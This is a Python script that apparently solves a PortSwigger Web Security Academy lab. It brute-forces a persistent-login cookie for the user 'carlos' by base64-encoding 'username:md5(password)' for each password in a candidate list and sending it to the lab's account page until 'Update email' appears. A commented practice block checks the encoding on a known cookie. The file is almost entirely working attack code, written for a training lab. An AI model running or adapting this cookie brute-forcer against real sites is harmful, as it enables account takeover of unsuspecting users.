import hashlib
import base64
import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080' , 'https': 'http://127.0.0.1:8080'}

fp = open('Candidate Passwords.txt', 'r')

def payload(password):
    username = 'carlos'
    hashed_password = hashlib.md5(password.encode()).hexdigest()
    add_prefix = username + ':' + hashed_password
    encode = add_prefix.encode('ascii')
    payload = base64.b64encode(encode)
    return payload.decode('ascii')

def main():
    url = 'https://0a0900dd03acb69ec2913e34007e00d1.web-security-academy.net/my-account'
    print('(+) Brute-forcing password:')
    for x in fp:
        password = x.strip('\n')
        cookies = {
            'stay-logged-in' : payload(password),
            'session' : 'BcLlHpKHXfisoCivac5SGa2TTXGaif3c' 
        }
        r = requests.get(url = url, cookies = cookies)
        if 'Update email' not in r.text:
            sys.stdout.write(password)
            sys.stdout.write('\r')
            sys.stdout.flush()
        else:
            print('Successfully !!!')
            print(password)
            break
    
if __name__ == '__main__':
    main()



# Learning how to use md5 hash functions and base64 encode functions in python
# username = 'wiener'
# password = 'peter'

# hashed_password = hashlib.md5(password.encode()).hexdigest()

# add_prefix = username + ':' + hashed_password
# encode = add_prefix.encode('ascii')

# payload = base64.b64encode(encode).decode('ascii')

# print(payload == 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw')